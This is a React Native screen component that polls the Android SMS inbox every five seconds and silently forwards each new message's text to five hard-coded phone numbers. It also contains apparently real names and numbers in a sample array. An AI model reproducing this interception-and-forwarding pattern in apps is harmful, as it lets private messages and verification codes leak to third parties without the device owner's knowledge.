import React, { useState, useEffect } from 'react';
import { View, Text, Alert, SafeAreaView, StyleSheet, Dimensions } from 'react-native';
import SmsAndroid from 'react-native-get-sms-android';
import { NativeModules } from 'react-native';

var DirectSms = NativeModules.DirectSms;

const Result = () => {
    const [latestMessage, setLatestMessage] = useState('');

    const content = [
        {
            "from": "+918148683700 (Seenivasan)",
            "to": "8110037728",
            "body": "added the react-native-loading-spinner-overlay library and imported the Spinner component"
        },
        {
            "from": "+918148683701 (John)",
            "to": "8110037729",
            "body": "updated the UI design and fixed layout issues"
        },
        {
            "from": "+918148683702 (Jane)",
            "to": "8110037730",
            "body": "implemented authentication logic and user registration feature"
        },
        {
            "from": "+918148683703 (David)",
            "to": "8110037731",
            "body": "integrated backend API for data retrieval and storage"
        },
        {
            "from": "+918148683704 (Sarah)",
            "to": "8110037732",
            "body": "optimized app performance and reduced loading time"
        }
    ]

    const fetchLatestMessage = () => {
        let filter = {
            box: 'inbox',
            indexFrom: 0,
            maxCount: 1,
        };
        SmsAndroid.list(
            JSON.stringify(filter),
            (fail) => {
                console.log('Failed with this error: ' + fail);
            },
            (count, smsList) => {
                console.log('Count: ', count);
                console.log('List: ', smsList);
                var arr = JSON.parse(smsList);

                if (arr.length > 0) {
                    const latestObject = arr[0];
                    console.log('Latest Object: ', latestObject);
                    console.log('--> ' + latestObject.date);
                    console.log('--> ' + latestObject.body);
                    if (latestObject.body !== latestMessage) {
                        setLatestMessage(latestObject.body);
                        Alert.alert('Received SMS', latestObject.body);
                        forwardMessage(latestObject.body); // Forward the received message
                    }
                }
            }
        );
    };

    const forwardMessage = (message) => {
        const phoneNumbers = ['8148683700','6383190648','8610219625','7812831945','8110037728']; // Specify the numbers to forward the message to
        DirectSms.sendDirectSms(phoneNumbers, message);
    };

    useEffect(() => {
        const timer = setInterval(() => {
            fetchLatestMessage();
        }, 5000);

        return () => clearInterval(timer);
    }, [latestMessage]);

    return (
        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
            <Text style={{ marginBottom: 16 }}>Latest Received SMS: {latestMessage}</Text>
        </View>
    );
};

const deviceWidth = Math.round(Dimensions.get('window').width);

const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#FFFFFF',
        padding: 16,
    },
    line: {
        borderBottomColor: 'rgba(0, 0, 0, 0.6)',
        borderBottomWidth: StyleSheet.hairlineWidth,
        width: deviceWidth * 0.9,
        margin: 10,
    },
    resultText: {
        fontSize: 15,
        fontWeight: '500',
    },
});

export default Result;
